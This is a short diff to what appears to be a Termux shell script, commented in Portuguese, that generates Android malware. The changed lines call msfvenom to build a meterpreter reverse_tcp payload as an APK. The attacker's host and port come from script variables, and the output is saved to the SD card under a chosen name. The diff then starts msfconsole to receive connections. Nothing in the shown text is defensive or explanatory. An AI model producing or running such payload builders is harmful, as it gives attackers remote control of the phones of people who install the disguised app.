@@ -52,8 +52,8 @@ figlet CREATE
 cd /data/data/com.termux/files/home/metasploit-framework
 #
 #Criando payload
-msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk
-
+./msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk
+./msfconsole
 fi
 if [ "$opcao" = "2" ];then
 echo
